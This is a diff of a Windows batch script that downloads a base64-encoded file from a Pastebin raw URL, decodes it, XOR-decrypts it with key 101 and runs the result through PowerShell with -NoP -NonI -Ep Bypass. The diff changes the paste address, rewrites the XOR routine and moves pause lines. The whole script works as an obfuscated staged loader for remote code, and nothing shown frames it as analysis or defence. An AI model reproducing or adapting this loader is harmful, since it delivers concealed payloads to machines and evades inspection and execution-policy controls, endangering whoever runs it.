@@ -32,7 +32,7 @@ set "timestamp=%datetime:~0,4%-%datetime:~4,2%-%datetime:~6,2%_%datetime:~8,2%-%
 
 :: Download the base64-encoded content from Pastebin
 echo Downloading script from Pastebin...
-powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/qHiHS8pY' -OutFile $env:TEMP\rb_%timestamp%.ps1"
+powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/rHP8Sda2' -OutFile $env:TEMP\rb_%timestamp%.ps1"
 if %errorlevel% NEQ 0 (
     echo Failed to download script.
     exit /B
@@ -44,6 +44,7 @@ echo Decoding the script content...
 powershell -Command "Add-Content $env:TEMP\decoded_%timestamp%.ps1 -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content $env:TEMP\rb_%timestamp%.ps1 -Raw))))"
 if %errorlevel% NEQ 0 (
     echo Failed to decode script content.
+    pause
     exit /B
 )
 echo Script decoded successfully.
@@ -54,10 +55,11 @@ type "%TEMP%\decoded_%timestamp%.ps1"
 
 :: Apply XOR decryption with detailed logs
 echo Applying XOR decryption...
-powershell -Command "$content = Get-Content $env:TEMP\decoded_%timestamp%.ps1 -Raw; $splitContent = $content.Trim() -split ','; $xorDecoded = @(); foreach ($item in $splitContent) { $decoded = [char]([int]$item.Trim() -bxor 101); $xorDecoded += $decoded }; $decryptedContent = -join $xorDecoded; $decryptedContent | Set-Content $env:TEMP\decrypted_%timestamp%.ps1"
+powershell -Command "$content = Get-Content $env:TEMP\decoded_%timestamp%.ps1 -Raw; $bytes = [System.Text.Encoding]::UTF8.GetBytes($content); $xorKey = 101; $decryptedBytes = $bytes | ForEach-Object { $_ -bxor $xorKey }; $decryptedContent = [System.Text.Encoding]::UTF8.GetString($decryptedBytes); $decryptedContent | Set-Content $env:TEMP\decrypted_%timestamp%.ps1"
 
 if %errorlevel% NEQ 0 (
     echo Failed to apply XOR decryption.
+    pause
     exit /B
 )
 echo XOR decryption applied successfully.
@@ -65,13 +67,13 @@ echo XOR decryption applied successfully.
 :: Print the XOR-decrypted content
 echo XOR-decrypted script content:
 type "%TEMP%\decrypted_%timestamp%.ps1"
-pause
 
 :: Execute the decrypted script
 echo Executing the decrypted script...
 powershell -NoP -NonI -Ep Bypass -File "%TEMP%\decrypted_%timestamp%.ps1"
 if %errorlevel% NEQ 0 (
     echo Execution failed.
+    pause
     exit /B
 )
 
